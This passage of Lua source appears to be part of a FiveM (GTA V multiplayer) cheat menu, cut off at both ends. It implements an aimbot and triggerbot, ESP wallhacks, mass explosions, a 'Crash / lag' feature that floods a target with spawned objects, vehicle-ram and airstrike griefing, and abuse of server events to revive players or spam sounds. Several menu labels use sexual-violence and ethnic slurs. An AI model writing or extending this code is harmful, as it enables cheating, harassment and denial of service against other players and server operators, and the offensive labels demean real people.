                    SetTimecycleModifierStrength(1.0)
                    StartScreenEffect('DrugsMichaelAliensFight', 50000, 1)
                    StartScreenEffect('DrugsMichaelAliensFightIn', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFight', 50000, 1)
                    StartScreenEffect('DrugsTrevorClownsFightIn', 50000, 1)
                end
            elseif F == 'Rape all players' then
                if G then
                    for F, G in pairs(o) do
                        local aF = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(G)))
                        if not t then
                            if not g[GetPlayerServerId(G)] then
                                local model = GetHashKey('a_m_m_acult_01')
                                while not HasModelLoaded(model) do
                                    Wait(0)
                                    RequestModel(model)
                                end
                                local bx = CreatePed(5, model, GetEntityCoords(aF), GetEntityHeading(aF), true, true)
                                g[GetPlayerServerId(G)] = bx
                                CreateThread(function()
                                    SetPedDefaultComponentVariation(bx)
                                    bw(bx)
                                    AttachEntityToEntity(bx, aF, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                                    while true do
                                        if not IsEntityPlayingAnim(bx, 'rcmpaparazzo_2', 'shag_loop_a', 3) then
                                            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                                                Wait(0)
                                                RequestAnimDict('rcmpaparazzo_2')
                                            end
                                            TaskPlayAnim(bx, 'rcmpaparazzo_2', 'shag_loop_a', 8.0, -8.0, -1, 1, 0, false, false, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            end
                        else
                            d[F] = false
                            aC()
                        end
                    end
                else
                    for F, G in pairs(g) do
                        if G then
                            CreateThread(function()
                                while DoesEntityExist(G) do
                                    Wait(0)
                                    while not NetworkHasControlOfEntity(G) do
                                        NetworkRequestControlOfEntity(G)
                                        Wait(0)
                                    end
                                    SetEntityAsMissionEntity(G, true, true)
                                    DeleteEntity(G)
                                    g[F] = nil
                                end
                            end)
                        end
                    end
                end
            elseif F == 'Explode everyone' then
                if G then
                    for F, G in pairs(o) do
                        local aF = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(G)))
                        AddExplosion(GetEntityCoords(aF), 34, 500.0, true, false, false, false)
                    end
                end
            elseif F == 'Give server cancer' then
                if G then
                    for F, G in pairs(o) do
                        local aF = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(G)))
                        local bO = { { 'scr_indep_fireworks', 'scr_indep_firework_starburst' }, { 'scr_indep_fireworks', 'scr_indep_firework_shotburst' }, { 'proj_xmas_firework', 'scr_firework_xmas_spiral_burst_rgw' } }
                        for F, G in pairs(bO) do
                            while not HasNamedPtfxAssetLoaded(G[1]) do
                                Wait(0)
                                RequestNamedPtfxAsset(G[1])
                            end
                            UseParticleFxAssetNextCall(G[1])
                            StartNetworkedParticleFxNonLoopedAtCoord(G[2], GetEntityCoords(aF) + vec3(0.0, 0.0, 15.0), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                        end
                        AddExplosion(GetEntityCoords(aF), 34, 500.0, true, false, 0.0)
                        local model = GetHashKey('dump')
                        while not HasModelLoaded(model) do
                            RequestModel(model)
                            Wait(0)
                        end
                        CreateVehicle(model, GetEntityCoords(aF), GetEntityHeading(aF), true, true)
                        if c and B < GetGameTimer() then
                            B = GetGameTimer() + 2500
                            TriggerServerEvent('InteractSound_SV:PlayOnAll', r[math.random(1, #r)], 1.0)
                        end
                    end
                end
            elseif F == 'Interactsound spammer' then
                if G then
                    if c and B < GetGameTimer() then
                        B = GetGameTimer() + 2500
                        local bP = r[math.random(1, #r)]
                        TriggerServerEvent('InteractSound_SV:PlayOnAll', bP, 1.0)
                    end
                end
            elseif F == 'Explosive hands' then
                if G then
                    if IsDisabledControlJustReleased(0, 24) and GetSelectedPedWeapon(PlayerPedId()) == -1569615261 then
                        local bQ, bQ, bQ, bQ, bx = GetRaycastResult(Cast_3dRayPointToPoint(GetEntityCoords(bG), GetOffsetFromEntityInWorldCoords(bG, 0.0, 1.3, 0.0), 1.0, 12, bG, 7))
                        if bx ~= 0 then
                            if bx ~= bG then
                                SetTimeout(450, function()
                                    AddExplosion(GetEntityCoords(bx), 34, 100000.0, true, false, 0.0)
                                end)
                            end
                        else
                            SetTimeout(450, function()
                                AddExplosion(GetPedBoneCoords(bG, 57005, vec3(0.0, 0.0, 0.0)), 34, 100000.0, true, false, 0.0)
                            end)
                        end
                    end
                end
            elseif F == 'Explosive ammo' then
                if G then
                    if IsPedArmed(bG, 7) and IsPedArmed(bG, 6) then
                        local a8, aS = GetPedLastWeaponImpactCoord(bG)
                        if a8 then
                            AddExplosion(aS, 34, 100000.0, true, false, 0.0)
                        end
                    end
                end
            elseif F == 'Teleport to bullet' then
                if G then
                    local a8, aS = GetPedLastWeaponImpactCoord(bG)
                    if a8 then
                        SetTimeout(100, function()
                            SetEntityCoords(bG, aS)
                        end)
                    end
                end
            elseif F == 'Show coords' then
                if G then
                    local aS = GetEntityCoords(bG)
                    local bI = GetEntityHeading(bG)
                    ar(('~m~X: ~s~%s ~m~Y: ~s~%s ~m~Z: ~s~%s ~m~H: ~s~%s'):format(string.format('%.2f', aS.x), string.format('%.2f', aS.y), string.format('%.2f', aS.z), string.format('%.2f', bI)), 0.0, true, nil, 0.35, 0.5, true, 0.1)
                end
            elseif F == 'Infinite ammo' then
                if G == 'off' then
                    SetPedInfiniteAmmoClip(bG, false)
                    for F, bR in pairs(a1) do
                        SetPedInfiniteAmmo(bG, false, GetHashKey(bR))
                    end
                elseif G == 'safe' then
                    SetPedInfiniteAmmoClip(bG, false)
                    for F, bR in pairs(a1) do
                        SetPedInfiniteAmmo(bG, false, GetHashKey(bR))
                    end
                    if GetAmmoInPedWeapon(bG, GetSelectedPedWeapon(bG)) < 15 then
                        local a8, ad = GetMaxAmmo(bG, GetSelectedPedWeapon(bG))
                        AddAmmoToPed(bG, GetSelectedPedWeapon(bG), ad)
                    end
                elseif G == 'infinite ammo' then
                    SetPedInfiniteAmmoClip(bG, true)
                    for F, bR in pairs(a1) do
                        SetPedInfiniteAmmo(bG, true, GetHashKey(bR))
                    end
                end
            elseif F == 'Player boxes' then
                if G then
                    for F, G in pairs(GetActivePlayers()) do
                        local aF = GetPlayerPed(G)
                        local aJ = d['ESP Distance']
                        local bS = false
                        if aJ then
                            if aJ ~= 'infinite' then
                                if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(aF)) <= tonumber(aJ) then
                                    bS = true
                                end
                            else
                                bS = true
                            end
                        else
                            bS = true
                        end
                        if bS then
                            if aF ~= bG or d['Include self'] then
                                if HasEntityClearLosToEntity(PlayerPedId(), aF, 17) then
                                    local bT = am(0.3)
                                    if IsPedDeadOrDying(aF) then
                                        bT = { 215, 0, 15, 255 }
                                    end
                                    aa(aF, bT)
                                else
                                    local bU = 1.85 / GetDistanceBetweenCoords(GetEntityCoords(bG), GetEntityCoords(aF), true)
                                    SetDrawOrigin(GetEntityCoords(aF))
                                    local bV = am(0.3)
                                    if IsPedDeadOrDying(aF) then
                                        bV = { 215, 0, 15 }
                                    end
                                    DrawRect(0.0, 0.0, bU / 3, bU, bV[1], bV[2], bV[3], 55)
                                    ClearDrawOrigin()
                                end
                            end
                        end
                    end
                end
            elseif F == 'Player lines' then
                if G then
                    for F, G in pairs(GetActivePlayers()) do
                        local aF = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(G)))
                        local aJ = d['ESP Distance']
                        local bS = false
                        if aJ then
                            if aJ ~= 'infinite' then
                                if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(aF)) <= tonumber(aJ) then
                                    bS = true
                                end
                            else
                                bS = true
                            end
                        else
                            bS = true
                        end
                        if bS then
                            local bV = am(0.3)
                            if IsPedDeadOrDying(aF) then
                                bV = { 215, 0, 15, 255 }
                            end
                            DrawLine(GetEntityCoords(bG), GetEntityCoords(aF), table.unpack(bV))
                        end
                    end
                end
            elseif F == 'Player names' then
                if G then
                    for F, G in pairs(GetActivePlayers()) do
                        local aF = GetPlayerPed(G)
                        local aJ = d['ESP Distance']
                        local bS = false
                        if aJ then
                            if aJ ~= 'infinite' then
                                if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(aF)) <= tonumber(aJ) then
                                    bS = true
                                end
                            else
                                bS = true
                            end
                        else
                            bS = true
                        end
                        if bS then
                            if aF ~= bG or d['Include self'] then
                                local bW = GetPlayerInvincible(G)
                                if IsPedDeadOrDying(aF) then
                                    if bW then
                                        a3(GetPlayerName(G) .. ' (' .. GetPlayerServerId(G) .. ')\n~r~Dead\n~g~Gödmôdê', GetPedBoneCoords(aF, U['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                    else
                                        a3(GetPlayerName(G) .. ' (' .. GetPlayerServerId(G) .. ')\n~r~Dead', GetPedBoneCoords(aF, U['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                    end
                                elseif bW then
                                    a3(GetPlayerName(G) .. ' (' .. GetPlayerServerId(G) .. ')\n~g~Gödmôdê', GetPedBoneCoords(aF, U['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                else
                                    a3(GetPlayerName(G) .. ' (' .. GetPlayerServerId(G) .. ')', GetPedBoneCoords(aF, U['head'], 0, 0, 0) + vec3(0.0, 0.0, 0.4), 0.25)
                                end
                            end
                        end
                    end
                end
            elseif F == 'Åïmßð†' then
                if G then
                    if IsDisabledControlPressed(0, 24) and IsPedArmed(bG, 6) then
                        for F, G in pairs(o) do
                            local aF = GetPlayerPed(G)
                            if aF ~= bG then
                                if DoesEntityExist(aF) and not IsPedDeadOrDying(aF) then
                                    if IsEntityVisible(aF) and HasEntityClearLosToEntity(bG, aF, 17) then
                                        if IsEntityOnScreen(aF) then
                                            for F, G in pairs(U) do
                                                local aI, a8, a9 = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(aF, G, 0, 0, 0)))
                                                local aJ = math.abs(0.5 - a8) + math.abs(0.5 - a9)
                                                if aJ <= u then
                                                    ClearPedTasks(bG)
                                                    if U[v] then
                                                        aR(GetPedBoneCoords(aF, U[v], 0, 0, 0))
                                                    else
                                                        aR(GetPedBoneCoords(aF, aE(aF), 0, 0, 0))
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            elseif F == 'Super handling' then
                local bH = GetVehiclePedIsUsing(bG)
                if bH then
                    if DoesEntityExist(bH) then
                        if G then
                            SetVehicleGravityAmount(bH, 20.0)
                        else
                            SetVehicleGravityAmount(bH, 10.0)
                        end
                    end
                end
            elseif F == '†rïggêrßð†' then
                if G then
                    local bX, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if bX then
                        for F, G in pairs(o) do
                            local aF = GetPlayerPed(G)
                            if aF ~= bG and aF == entity then
                                if DoesEntityExist(aF) and not IsPedDeadOrDying(aF) then
                                    if IsEntityVisible(aF) then
                                        for F, G in pairs(U) do
                                            aR(GetPedBoneCoords(aF, aE(aF), 0, 0, 0))
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            elseif F == 'Firework ammo' then
                if G then
                    if IsPedArmed(bG, 7) and IsPedArmed(bG, 6) then
                        CreateThread(function()
                            local a8, aS = GetPedLastWeaponImpactCoord(bG)
                            if a8 then
                                local bO = { { 'proj_indep_firework', 'scr_indep_launcher_sparkle_spawn' }, { 'proj_indep_firework_v2', 'scr_xmas_firework_burst_fizzle' }, { 'proj_indep_firework_v2', 'scr_firework_indep_burst_rwb' }, { 'proj_xmas_firework', 'scr_firework_xmas_ring_burst_rgw' } }
                                for F, G in pairs(bO) do
                                    if G then
                                        if G[1] and G[2] then
                                            while not HasNamedPtfxAssetLoaded(G[1]) do
                                                Wait(0)
                                                RequestNamedPtfxAsset(G[1])
                                            end
                                            UseParticleFxAssetNextCall(G[1])
                                            StartNetworkedParticleFxNonLoopedAtCoord(G[2], aS + vec3(0.0, 0.0, 3.5), 0.0, 180.0, 0.0, 20.0, false, false, false, false)
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end
            elseif F == 'Show åïmßð† fov' then
                if G then
                    DrawRect(0.5, 0.5, u, u * 1.78, 45, 45, 45, 75)
                end
            elseif F == '§þïñßð†' then
                if G then
                    if not (IsControlPressed(0, 32) or IsControlPressed(0, 33) or IsControlPressed(0, 34) or IsControlPressed(0, 35) or IsPedInAnyVehicle(bG, false)) then
                        SetEntityHeading(bG, GetEntityHeading(bG) + 5)
                    end
                end
            elseif F == 'Neon RGB' then
                if G then
                    local bH = GetVehiclePedIsUsing(bG)
                    if bH then
                        SetVehicleNeonLightsColour(bH, table.unpack(am(0.2)))
                    end
                end
            elseif F == 'Paintjob RGB' then
                if G then
                    local bH = GetVehiclePedIsUsing(bG)
                    if bH then
                        SetVehicleCustomPrimaryColour(bH, table.unpack(am(0.2)))
                        SetVehicleCustomSecondaryColour(bH, table.unpack(am(0.2)))
                    end
                end
            elseif F == 'Boost vehicle' then
                local bH = GetVehiclePedIsUsing(bG)
                if bH then
                    if G then
                        SetVehicleEnginePowerMultiplier(bH, tonumber(G) / 1)
                    else
                        SetVehicleEnginePowerMultiplier(bH, 0.0)
                    end
                end
            elseif F == 'Speedometer' then
                local bH = GetVehiclePedIsUsing(bG)
                if DoesEntityExist(bH) then
                    local bY = math.floor(GetEntitySpeed(bH) * 3.6)
                    local bT = '~s~'
                    if bY > 100 then
                        bT = '~o~'
                        if bY > 200 then
                            bT = '~r~'
                        end
                    end
                    if G == 'km/h' then
                        local bY = math.floor(GetEntitySpeed(bH) * 3.6)
                        ar(('%s%s ~s~km/h'):format(bT, bY), 0.95, false, { 210, 210, 210 }, 0.3, 0.9, true, 0.1)
                    elseif G == 'mph' then
                        local bZ = math.floor(GetEntitySpeed(bH) * 2.236936)
                        ar(('%s%s ~s~mph'):format(bT, bZ), 0.95, false, { 210, 210, 210 }, 0.3, 0.9, true, 0.1)
                    end
                end
            end
        end
        Wait(0)
    end
end)
local b_ = { { y, 1 }, { 'SELF MENU', 2, 1 }, { 'MENU OPTIONS', 3, 1 }, { 'SERVER RESOURCES', 4, 3 }, { 'CREDITS', 5, 1 }, { 'SERVER MENU', 6, 1 }, { 'WEAPON OPTIONS', 7, 1 }, { 'ESP MENU', 8, 1 }, { 'PLAYER LIST', 9, 1 }, { 'LOADING...', 10, 9 }, { 'ESX', 11, 1 }, { 'VEHICLE MENU', 12, 1 }, { 'DRIVE TO WAYPOINT', 13, 12 }, { 'LOS SANTOS CUSTOMS', 14, 12 }, { 'LSC - COSMETICS', 15, 14 }, { 'LSC - PERFORMANCE', 16, 14 }, { 'VEHICLE SPAWNER', 17, 12 }, { 'WEATHER MENU', 18, 1 }, { 'WEAPON CUSTOMIZATION', 19, 7 }, { 'RESOURCE INFO', 20, 4 }, { 'TELEPORT MENU', 21, 2 }, { 'ANIMATIONS MENU', 22, 2 }, { 'INTERACTSOUND MENU', 23, 6 }, { 'DEBUG MENU', 24, 1 }, { 'WEAPON AMMO', 25, 7 }, { 'FREECAM MENU', 26, 2 } }
local c0 = function(aM)
    if aM['Type'] == 'toggle' then
        a0 = aM['Enabled']
    elseif aM['Type'] == 'list' then
        if string.find(aM['Text'], 'Red') then
            _[1] = aM['Current'] - 1
        elseif string.find(aM['Text'], 'Green') then
            _[2] = aM['Current'] - 1
        elseif string.find(aM['Text'], 'Blue') then
            _[3] = aM['Current'] - 1
        elseif string.find(aM['Text'], 'Alpha') then
            _[4] = aM['Current'] - 1
        elseif string.find(aM['Text'], 'Delay') then
            b = tonumber(aM['Items'][aM['Current']])
        end
    end
end
local c1 = function(aM)
    local aF = GetPlayerPed(GetPlayerFromServerId(h))
    if aM['Text'] == 'Teleport' then
        SetEntityCoords(PlayerPedId(), GetEntityCoords(aF))
        local T = GetGameTimer() + 5000
        while not HasCollisionLoadedAroundEntity(aF) do
            if T < GetGameTimer() then
                break
            end
            Wait(0)
            SetEntityCoords(PlayerPedId(), GetEntityCoords(aF))
        end
    elseif aM['Text'] == 'Remove all weapons' then
        RemoveAllPedWeapons(aF)
    elseif aM['Text'] == 'Give all weapons' then
        for F, G in pairs(a1) do
            GiveWeaponToPed(aF, GetHashKey(G), 250, false, false)
        end
    elseif aM['Text'] == 'Give weapon' then
        GiveWeaponToPed(aF, GetHashKey(aM['Items'][aM['Current']]), 250, false, false)
    elseif aM['Text'] == 'Explode' then
        if aM['Items'][aM['Current']] == 'silent' then
            AddExplosion(GetEntityCoords(aF), 34, 500.0, false, true, false, false)
        else
            AddExplosion(GetEntityCoords(aF), 34, 500.0, true, false, false, false)
        end
    elseif aM['Text'] == 'Give health' then
        CreatePickup(GetHashKey('PICKUP_HEALTH_STANDARD'), GetEntityCoords(aF))
    elseif aM['Text'] == 'Give armour' then
        CreatePickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), GetEntityCoords(aF))
    elseif aM['Text'] == 'Bring vehicle' then
        CreateThread(function()
            local bH = GetVehiclePedIsIn(aF)
            while not NetworkHasControlOfEntity(bH) do
                NetworkRequestControlOfEntity(bH)
                Wait(0)
            end
            for Q = 0, 100 do
                SetEntityCoords(bH, GetEntityCoords(PlayerPedId()) + vec3(0.0, 0.0, 3.0))
                Wait(5)
            end
        end)
    elseif aM['Text'] == 'Kick from vehicle' then
        ClearPedTasksImmediately(aF)
    elseif aM['Text'] == '[UNSAFE] Revive' then
        TriggerServerEvent('esx_ambulancejob:revive', h, h)
        TriggerServerEvent('whoapd:revive', h)
        TriggerServerEvent('paramedic:revive', h)
        TriggerServerEvent('ems:revive', h)
    elseif aM['Text'] == 'Destroy vehicle' then
        CreateThread(function()
            local bH = GetVehiclePedIsIn(aF)
            while not NetworkHasControlOfEntity(bH) do
                NetworkRequestControlOfEntity(bH)
                Wait(0)
            end
            NetworkRequestControlOfEntity(bH)
            SetVehicleUndriveable(bH, true)
            SetVehicleEngineHealth(bH, 0)
            Wait(100)
        end)
    elseif aM['Text'] == 'Airstrike' then
        if not t then
            CreateThread(function()
                local c2 = function(c3)
                    local model = GetHashKey('lazer')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local c4 = CreateVehicle(model, c3, GetEntityHeading(aF), true, true)
                    ControlLandingGear(c4, 1)
                    local model = GetHashKey('u_m_y_abner')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local c5 = CreatePedInsideVehicle(c4, 4, model, -1, true, true)
                    local c6 = GetGameTimer() + 999999
                    local c7 = false
                    while true do
                        Wait(750)
                        TaskVehicleDriveToCoord(c5, c4, GetEntityCoords(aF), 9999.0, 0, GetHashKey('lazer'), 16777216, 1.0, 1)
                        if #(GetEntityCoords(aF).xy - GetEntityCoords(c4).xy) <= 450.0 then
                            if not c7 then
                                c7 = true
                                c6 = GetGameTimer() + 5000
                            end
                            ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(c4, 0.0, 0.0, -30.0), GetOffsetFromEntityInWorldCoords(aF, 0.0, math.random(-5, 5), -5.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_SPACE_ROCKET"), c5, true, false, 9000.0)
                        end
                        if c6 <= GetGameTimer() then
                            DeleteEntity(c4)
                            DeleteEntity(c5)
                            return
                        end
                    end
                end
                for F, G in pairs({ vec2(0.0, -1000.0), vec2(0.0, 1000.0), vec2(1000.0, 0.0), vec2(-1000.0, 0.0), vec2(-1000.0, 1000.0), vec2(1000.0, -1000.0), vec2(1000.0, 1000.0), vec2(-1000.0, -1000.0) }) do
                    CreateThread(function()
                        c2(GetOffsetFromEntityInWorldCoords(aF, G['x'], G['y'], 1000.0))
                    end)
                    Wait(250)
                end
            end)
        else
            aC()
        end
    elseif aM['Text'] == 'Spectate' then
        j = true
        k = h
        for F, G in pairs(Z[10]) do
            if string.find(G['Text']:lower(), 'spectat') then
                G['Text'] = 'Stop spectating'
            end
        end
        DestroyCam(l)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)
        l = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
        RenderScriptCams(1, 0, 0, 1, 1)
        SetCamActive(l, true)
        SetFocusEntity(aF)
        local b2 = 0.0
        local b3 = 0.0
        local b4 = 0.0
        CreateThread(function()
            local c8 = vec3(0.0, -4.0, 3.0)
            while j do
                Wait(0)
                b2 = b2 - GetDisabledControlNormal(1, 2) * 8.0
                b4 = b4 - GetDisabledControlNormal(1, 1) * 8.0
                if b2 > 90.0 then
                    b2 = 90.0
                elseif b2 < -90.0 then
                    b2 = -90.0
                end
                if b3 > 90.0 then
                    b3 = 90.0
                elseif b3 < -90.0 then
                    b3 = -90.0
                end
                if b4 > 360.0 then
                    b4 = b4 - 360.0
                elseif b4 < -360.0 then
                    b4 = b4 + 360.0
                end
                local b5 = GetEntityRotation(aF)
                SetCamRot(l, b5.x + b2, b5.y + b3, b5.z + b4, 2)
                local b6 = b4 / 18.0
                if b6 > 10.5 then
                    b6 = b6 - 21
                elseif b6 < -10.5 then
                    b6 = b6 + 21
                end
                print(b6)
                local b7 = b2 / 10.0 * -1
                local aS = GetEntityCoords(aF)
                local aQ, b8 = GetGroundZFor_3dCoord(aS.x, aS.y, aS.z, true)
                local b9 = 0.0
                if aQ then
                    if GetOffsetFromEntityInWorldCoords(aF, 0.0, 0.0, b7).z - b8 < 0.0 then
                        b9 = b7 * -1
                        if b9 > 1.75 then
                            b9 = 1.75
                        end
                        b7 = b8 - GetEntityCoords(aF).z
                    end
                end
                b7 = b7 + 0.25
                if b7 > 4.0 then
                    b9 = b7 - 4.0
                    if b9 > 5.0 then
                        b9 = 5.0
                    end
                    b7 = 4.0
                end
                if b6 > 3.0 then
                    if b6 > 7.5 then
                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, 3.0 - (b6 - 7.5), -4.5 + b9 + b6, b7))
                    else
                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, 3.0, -4.5 + b9 + b6, b7))
                    end
                else
                    if b6 < -3.0 then
                        if b6 < -7.5 then
                            SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, -3.0 - (b6 + 7.5), -4.5 + b9 - b6, b7))
                        else
                            SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, -3.0, -4.5 + b9 - b6, b7))
                        end
                    else
                        if b6 > 0.0 then
                            SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, b6, -4.5 + b9 + b6, b7))
                        else
                            SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aF, b6, -4.5 + b9 - b6, b7))
                        end
                    end
                end
            end
            ClearFocus()
        end)
    elseif aM['Text'] == 'Slap' then
        CreateThread(function()
            for Q = 1, 1000 do
                CreateThread(function()
                    local model = GetHashKey('t20')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local c9 = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(aF, 0.0, -8.0, 0.0), GetEntityHeading(aF), true, true)
                    SetVehicleForwardSpeed(c9, 750 / 3.6)
                    SetEntityVisible(c9, false)
                    Wait(250)
                    DeleteEntity(c9)
                end)
                Wait(15)
            end
        end)
    elseif aM['Text'] == 'Stop spectating' then
        j = false
        k = 0
        for F, G in pairs(Z[10]) do
            if string.find(G['Text']:lower(), 'spectat') then
                G['Text'] = 'Spectate'
            end
        end
        DestroyCam(l)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)
    elseif aM['Text'] == 'Crash / lag' then
        if not t then
            local ca = { 0x34315488, 0x6A27FEB1, 0xCB2ACC8, 0xC6899CDE, 0xD14B5BA3, 0xD9F4474C, 0x32A9996C, 0x69D4F974, 0xCAFC1EC3, 0x79B41171, 0x1075651, 0xC07792D4, 0x781E451D, 0x762657C6, 0xC2E75A21, 0xC3C00861, 0x81FB3FF0, 0x45EF7804, 0xE65EC0E4, 0xE764D794, 0xFBF7D21F, 0xE1AEB708, 0xA5E3D471, 0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8, 0x8FB233A4, 0x24E08E1F, 0x337B2B54, 0xB9402F87, 0x4F2526DA }
            if #(GetEntityCoords(aF) - GetEntityCoords(PlayerPedId())) < 1000 then
                SetEntityCoords(PlayerPedId(), GetEntityCoords(aF) + vec3(1250, 1250, 1000))
            end
            for F, G in pairs(ca) do
                while not HasModelLoaded(G) do
                    RequestModel(G)
                    Wait(0)
                end
                CreateObject(G, GetEntityCoords(aF), true, true, true)
            end
        else
            aC()
        end
    elseif aM['Text'] == 'Cage' then
        if not t then
            local model = GetHashKey('prop_fnclink_05crnr1')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            local bv = CreateObject(model, GetEntityCoords(aF) + vec3(-1.7, -1.7, -1.0), true, true, true)
            table.insert(m, bv)
            SetEntityHeading(bv, -90.0)
            FreezeEntityPosition(bv, true)
            bv = CreateObject(model, GetEntityCoords(aF) + vec3(1.7, 1.7, -1.0), true, true, true)
            table.insert(m, bv)
            SetEntityHeading(bv, 90.0)
            FreezeEntityPosition(bv, true)
        else
            aC()
        end
    elseif aM['Text'] == 'Allahu akbar' then
        local model = GetHashKey('mp_m_freemode_01')
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end
        local bx = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(aF, 0.0, -1.0, -1.0), GetEntityHeading(aF), true, true)
        SetPedDefaultComponentVariation(bx)
        SetPedHeadBlendData(bx, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
        SetPedComponentVariation(bx, 1, 115, 0, 2)
        SetPedComponentVariation(bx, 3, 4, 0, 2)
        SetPedComponentVariation(bx, 11, 12, 0, 2)
        SetPedComponentVariation(bx, 8, 15, 0, 2)
        SetPedComponentVariation(bx, 4, 56, 0, 2)
        SetPedComponentVariation(bx, 6, 34, 0, 2)
        CreateThread(function()
            PlayPain(bx, 6, 0, 0)
            Wait(500)
            AddExplosion(GetEntityCoords(bx), 34, 500.0, true, false, false, false)
        end)
    elseif aM['Text'] == 'Drive-by [ped]' then
        CreateThread(function()
            local bE, aS = GetClosestVehicleNode(table.unpack(GetEntityCoords(aF)), 1)
            while not bE do
                bE, aS = GetClosestVehicleNode(table.unpack(GetEntityCoords(aF)), 1)
                Wait(250)
            end
            local model = GetHashKey('baller')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            print(aS)
            local bg = CreateVehicle(model, aS, 0.0, true, true)
            local model = GetHashKey('u_m_y_abner')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            local cb = CreatePedInsideVehicle(bg, 4, model, -1, true, true)
            GiveWeaponToPed(cb, GetHashKey('WEAPON_PISTOL50'), 250, false, true)
            SetPedInfiniteAmmo(cb, true, GetHashKey('WEAPON_PISTOL50'))
            SetPedInfiniteAmmoClip(cb, true)
            local c6 = GetGameTimer() + 999999
            local c7 = false
            TaskVehicleFollow(cb, bg, aF, 40.0, 262144, 10)
            while true do
                Wait(750)
                print(#(GetEntityCoords(aF).xy - GetEntityCoords(cb).xy))
                if #(GetEntityCoords(aF).xy - GetEntityCoords(cb).xy) <= 50.0 and HasEntityClearLosToEntity(cb, aF, 17) then
                    if not c7 then
                        c7 = true
                        c6 = GetGameTimer() + 25000
                    end
                end
                if c7 then
                    TaskCombatPed(cb, aF, 0, 16)
                    SetPedCombatAttributes(cb, 3, false)
                    SetPedCombatAttributes(cb, 0, false)
                    if IsPedDeadOrDying(aF) then
                        c6 = 0
                    end
                end
                if c6 <= GetGameTimer() then
                    ClearPedTasks(cb)
                    TaskVehicleDriveWander(cb, bg, 40.0, 262144)
                    SetTimeout(15000, function()
                        DeleteEntity(cb)
                        DeleteEntity(bg)
                    end)
                    return
                end
            end
        end)
    elseif aM['Text'] == 'Set as friend' then
        i[h] = true
        for F, G in pairs(Z[10]) do
            if string.find(G['Text']:lower(), 'friend') then
                G['Text'] = 'Remove friend'
            end
        end
    elseif aM['Text'] == 'Remove friend' then
        i[h] = false
        for F, G in pairs(Z[10]) do
            if string.find(G['Text']:lower(), 'friend') then
                G['Text'] = 'Set as friend'
            end
        end
    end
end
local cc = function(aM)
    CreateThread(function()
        local model = GetHashKey(aM['Items'][aM['Current']])
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end
        local c9 = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), -4.0, 2.0, 0.0), GetEntityHeading(PlayerPedId()), true, true)
        SetVehicleNeedsToBeHotwired(c9, false)
        SetVehRadioStation(c9, 'OFF')
        SetVehicleDirtLevel(c9, 0.0)
        if d['Enter car when spawning'] then
            SetEntityCoords(c9, GetEntityCoords(PlayerPedId()))
            TaskWarpPedIntoVehicle(PlayerPedId(), c9, -1)
        end
    end)
end
local cd = function(aM)
    local a4 = aM['Text']:lower()
    local bH = GetVehiclePedIsUsing(PlayerPedId())
    if string.find(aM['Text']:lower(), ('custom input'):lower()) then
        local bg = ah('What car do you want to spawn?', '', 30)
        if bg then
            cc({ ['Items'] = { bg }, ['Current'] = 1 })
        end
    elseif string.find(a4, 'neon lights') then
        if aM['Type'] == 'toggle' then
            if DoesEntityExist(bH) then
                for Q = 0, 3 do
                    SetVehicleNeonLightEnabled(bH, Q, aM['Enabled'])
                end
            end
        end
    elseif a4 == 'neon rgb' or a4 == 'paintjob rgb' or a4 == 'vehicle nitro [l ctrl]' then
        d[aM['Text']] = aM['Enabled']
    elseif a4 == 'set vehicle plate text' then
        local bg = GetVehiclePedIsUsing(PlayerPedId())
        if bg then
            if DoesEntityExist(bg) then
                local ce = ah('What plate do you want?', '', 8)
                if ce then
                    SetVehicleNumberPlateText(bg, ce)
                end
            else
                aB('You are not sitting in a vehicle.')
            end
        else
            aB('You are not sitting in a vehicle.')
        end
    elseif a4 == 'boost vehicle' then
